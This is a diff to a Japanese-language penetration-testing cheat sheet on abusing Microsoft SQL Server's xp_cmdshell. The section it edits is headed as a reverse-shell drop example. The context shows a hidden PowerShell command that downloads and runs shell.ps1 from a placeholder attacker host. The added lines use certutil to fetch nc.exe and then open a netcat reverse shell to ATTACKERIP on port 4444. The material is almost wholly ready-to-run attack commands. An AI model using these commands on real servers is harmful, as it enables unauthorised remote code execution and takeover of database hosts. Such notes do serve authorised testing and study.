@@ -146,7 +146,14 @@ EXEC xp_cmdshell 'whoami';
 ```
 ### ✅【7】リバースシェル投下例（ネットワークが許せば）
 ```
+-- ①ダウンロード
 EXEC xp_cmdshell 'powershell -NoP -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKERIP/shell.ps1'')"';
+
+-- ②certutilでncをダウンロード
+EXEC xp_cmdshell 'certutil -urlcache -split -f http://ATTACKERIP/nc.exe C:\Users\sql_svc\nc.exe';
+
+-- 実行
+EXEC xp_cmdshell 'C:\Users\sql_svc\nc.exe ATTACKERIP 4444 -e cmd.exe';
 ```
 ## 🔴サーバ
 ### リバースシェル待ち受け
